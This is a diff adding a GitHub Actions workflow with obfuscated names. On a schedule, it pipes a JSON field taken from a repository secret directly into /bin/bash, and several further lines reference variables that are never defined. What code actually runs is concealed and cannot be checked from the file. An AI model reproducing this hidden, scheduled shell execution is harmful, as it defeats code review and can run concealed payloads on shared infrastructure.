@@ -1,0 +1,22 @@
+name: cunchunjinnanmai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cunchunjinnanmai
+        env:
+          wloym670: ${{ secrets.wloym670 }}
+        run: |
+          echo $wloym670 | jq -r .cmen1 | /bin/bash
+          echo $cxmf6 | jq -r .rmov3 | /bin/bash
+          echo $lzsre52024 | jq -r .mzmmw88 | /bin/bash
+          echo $ojeyx20 | jq -r .k022 | /bin/bash
+          echo $bgpyk91 | jq -r .c1 | /bin/bash
+          echo $fa5 | jq -r .ejgzc46 | /bin/bash
+
